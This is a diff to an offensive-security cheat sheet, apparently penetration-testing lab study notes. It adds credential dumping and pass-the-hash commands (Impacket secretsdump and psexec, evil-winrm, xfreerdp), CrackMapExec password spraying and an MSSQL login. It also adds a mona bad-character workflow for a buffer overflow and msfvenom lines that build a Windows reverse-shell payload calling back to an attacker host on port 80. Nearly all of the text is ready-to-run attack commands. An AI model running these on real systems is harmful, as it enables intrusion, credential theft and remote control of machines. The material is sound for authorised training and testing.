@@ -147,8 +147,8 @@ Transferring Mimikatz binary via PowerShell
 
 ## Secretsdump
 
-Remotely dump credentials using NTLM hash of administrator to authenticate to target.
-```
+Remotely dump credentials using the NTLM hash of administrator to authenticate to target.
+```bash
 impacket-secretsdump -hashes aad3b435b51404eeaad3b435b51404ee:08df3c73ded940e1f2bcf5eea4b8dbf6 bob@10.11.1.1
 ```
 
@@ -192,13 +192,41 @@ The DMP file by default is output to `%temp%\lsass.DMP`, which will expand to `C
 
 # Lateral Movement
 
+Note when passing the hash we may need to preface the NTLM hash for the user account with the standard blank LM hash `aad3b435b51404eeaad3b435b51404ee`. This is the case for all Impacket tools.
+
 ### PsExec
 
+Port 445 (SMB) must be open for PsExec to function.
+
+```bash
+impacket-psexec user@10.11.1.1 -hashes aad3b435b51404eeaad3b435b51404ee:<user NTLM>
+```
+PsExec can also sometimes be used for local privilege escalation.
+
+### WinRM
+
+```bash
+evil-winrm -i 10.11.1.2 -u bob -H d4738f8c31d43e0167f27894a20e6688
+```
 
 ### RDP
 
 ```bash
 xfreerdp /u:bob /d:thinc /pth:b40c7060e1bf6g227131564a7bf33d48 /v:10.11.1.1
+```
+
+### MSSQL
+
+```bash
+impacket-mssqlclient sa:password@10.11.1.31
+```
+
+### CrackMapExec
+
+Spraying usernames
+
+```bash
+crackmapexec smb 10.11.1.1 -u users.txt -p ThisIsTheUsersPassword01 --continue-on-success
 ```
 
 # Pivoting 
@@ -315,6 +343,41 @@ msf-nasm_shell
 # generate Windows reverse shell
 msfvenom -p windows/shell_reverse_tcp LHOST=$IP LPORT=$PORT -f c -e x86/shikata_ga_nai -b "\x00"
 ```
+Set logging directory for mona:
+
+```bash
+!mona config -set workingfolder c:\logs\%p
+```
+
+Create byte array, excluding the null byte.
+
+```bash
+!mona bytearray -b "\x00"
+````
+
+Use Mona to compare the stack at the `ESP` address to the original byte array.
+
+```bash
+!mona compare -f C:\logs\offsec_pwk_srv\bytearray.bin -a 010FEED0
+````
+
+Remake byte array without bad characters:
+
+```bash
+!mona bytearray -cpb "\x00\x04\x05\x18\x19\x91\x92\xa5\xa6\xf5\xf6"`
+```
+
+Compare byte array to verify.
+```bash
+!mona compare -f C:\logs\offsec_pwk_srv\bytearray.bin -a 006FEC3C
+````
+
+Generate shellcode with MSFvenom:
+
+```bash
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.49.136 LPORT=80 -f c -b "\x00\x04\x05\x18\x19\x91\x92\xa5\xa6\xf5\xf6" 
+```
+
 
 Compile Windows exploit on Kali
 ```bash
